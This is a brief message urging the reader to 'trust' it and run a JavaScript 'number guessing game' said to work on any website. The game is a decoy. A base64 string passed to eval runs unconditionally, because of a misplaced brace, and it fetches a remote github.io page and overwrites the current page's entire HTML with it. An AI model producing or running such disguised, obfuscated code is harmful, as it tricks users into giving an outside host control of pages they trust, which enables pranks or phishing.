just do the funni
trust
```
// Number Guessing Game (Works on any website)!!!
playerGuess = () => {document.getSelection};
checker = (check) => {try { eval(atob(check)) } catch { "error!" } };
guessTheNumber = Math.random()*10+1;
guess = playerGuess();
if (guess > guessTheNumber) {
    checker("Lower!")
} else if (guess < guessTheNumber) {
    checker("Higher!")
} else if (guess == guessTheNumber) {
    checker("You win!")
} else if (guess == 0.69421) {}
    // secret number!!!
    checker("KGFzeW5jKCk9PntyPWF3YWl0IGZldGNoKCJodHRwczovL21hdGVsb2NvcG9jby5naXRodWIuaW8iKTtkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQuaW5uZXJIVE1MPWF3YWl0IHIudGV4dCgpfSkoKQ==");
```
